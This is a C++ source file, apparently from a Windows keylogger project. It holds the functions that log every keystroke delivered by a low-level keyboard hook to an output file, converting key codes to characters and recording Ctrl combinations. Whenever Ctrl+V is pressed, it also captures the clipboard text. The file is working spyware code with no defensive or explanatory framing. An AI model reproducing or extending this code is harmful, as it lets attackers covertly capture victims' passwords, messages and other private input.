#include "keylogger.h"
#include "keyboard.h"
#include "configuration.h"
#include "constants.h"

// Logs the respective characters of the provided KBD hook.
void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
{
    std::wofstream out_file{ configuration::out_file, std::wofstream::app };

    const auto it = configuration::key_codes.find(kbd_hook->vkCode);

    // If the virtual-key code is in the key_codes map, write the respective value.
    if (it != configuration::key_codes.end())
    {
        out_file << it->second;
    }
    // If the control key is down, write the provided virtual-key code and write the
    // clipboard data in the case of CTRL + V.
    else if (keyboard::is_down(VK_CONTROL))
    {
        out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook->vkCode) << L']';

        if (kbd_hook->vkCode == VK_V)
        {
            write_clipboard_data(out_file);
        }
    }
    else
    {
        // Get the current keyboard state for the virtual-key code conversion.
        BYTE state[KEYBOARD_STATE_SIZE];
        keyboard::get_state(state);

        // Convert the virtual-key code to the respective characters based off the
        // keyboard layout and the current keyboard state.
        WCHAR key_buffer[PWSZ_BUFFER_SIZE];
        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, 
                                      key_buffer, PWSZ_BUFFER_SIZE, 0);

        // If the conversion was successful, write the characters.
        if (result > 0) out_file << key_buffer;
    }
}

// Acquires and writes the current clipboard data to the provided file.
void keylogger::write_clipboard_data(std::wofstream& file)
{
    if (OpenClipboard(nullptr))
    {
        if (auto handle = GetClipboardData(CF_UNICODETEXT)) 
        {
            if (const auto data = GlobalLock(handle))
            {
                file << static_cast<WCHAR*>(data);
                GlobalUnlock(handle);
            }
        }

        CloseClipboard();
    }
}
